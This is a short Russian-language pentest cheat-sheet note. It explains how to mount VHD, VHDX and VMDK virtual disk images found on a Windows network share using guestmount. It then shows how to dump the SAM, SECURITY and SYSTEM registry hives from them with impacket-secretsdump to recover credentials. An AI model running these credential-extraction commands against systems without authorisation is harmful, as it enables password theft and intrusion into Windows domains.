#creds #lpe #windows #AD 

Три конкретных типа файлов представляют интерес: `.vhd`, `.vhdx`, и `.vmdk`файлы. Это `Virtual Hard Disk`, `Virtual Hard Disk v2`(оба используются Hyper-V), и `Virtual Machine Disk`(используется VMware)

Если мы обнаружим какой-либо из этих трех файлов, у нас есть возможность смонтировать его на наших локальных серверах Linux или Windows. Если мы сможем смонтировать общий ресурс с нашего сервера Linux или скопировать один из этих файлов, мы сможем смонтировать его и изучить различные файлы и папки операционной системы, как если бы мы вошли в систему, используя следующие команды.

#### Монтирование VMDK в Linux
```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

#### Монтирование VHD/VHDX в Linux
```bash
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

#### Далее просто извлекаем учетки SAM, SYSTEM, SECURITY
```bash
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```